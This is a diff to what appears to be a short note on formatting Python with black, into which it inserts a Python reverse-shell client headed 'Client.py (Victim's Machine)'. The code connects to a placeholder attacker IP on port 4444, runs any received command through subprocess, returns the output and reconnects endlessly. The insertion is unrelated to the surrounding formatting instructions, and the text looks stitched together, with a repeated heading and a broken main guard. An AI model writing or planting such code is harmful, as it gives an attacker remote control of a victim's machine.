@@ -4,6 +4,31 @@ pip install black
 
 # Format code with black
 black your_script.py
+**Client.py (Victim's Machine)**
+import socket
+import subprocess
+import os
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("attacker_ip", 4444))  # Replace "attacker_ip" with the attacker's IP address
+    while True:
+        command = s.recv(1024).decode()
+        if command.lower() == "exit":
+            break
+        output = subprocess.getoutput(command)
+        s.send(output.encode())
+    s.close()
+
+def main():
+    while True:
+        try:
+            connect()
+        except:
+            pass
+
+if _name_ == "_main_":
+    main()
 
 
 **Client.py (Victim's Machine)**
